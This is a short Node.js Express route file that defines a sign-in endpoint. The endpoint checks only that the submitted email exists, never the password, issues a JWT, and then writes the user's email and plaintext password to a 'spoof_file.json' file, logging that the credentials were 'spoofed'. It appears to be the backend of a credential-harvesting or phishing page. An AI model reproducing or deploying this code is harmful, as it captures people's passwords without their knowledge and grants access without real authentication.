const express = require("express");
const fs = require("fs/promises");
const router = express.Router();
const jwt = require("jsonwebtoken");
const path = require("path");

const pathToUsersFile = path.join(__dirname, ".." + "/data/" + "users.json");
const pathToSpoofFile = path.join(
  __dirname,
  ".." + "/data/" + "spoof_file.json"
);

router.post("/api/auth/signin", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).send({
      data: { error: "email or password fields are required" },
    });
  }

  console.log("Here:reached");

  try {
    const usersData = await fs.readFile(pathToUsersFile);
    console.log(usersData);
    const users = JSON.parse(usersData);
    console.log(users);

    const existingUser = users.some((user) => user.email === email);
    if (!existingUser) {
      return res.status(404).send({
        error: "Invalid Creditials. Invalid Email or password",
      });
    }
    const authToken = jwt.sign({ email }, process.env.JWT_KEY);
    const data = { email, password };

    console.log("Here:reached");

    await fs.writeFile(pathToSpoofFile, JSON.stringify(data));
    console.log("User's email and password has been spoofed to file");

    return res.status(200).send({
      data: { authToken },
    });
  } catch (error) {
    console.error(error);
    return res.status(400).send({ error });
  }
});

module.exports = { signinRouter: router };
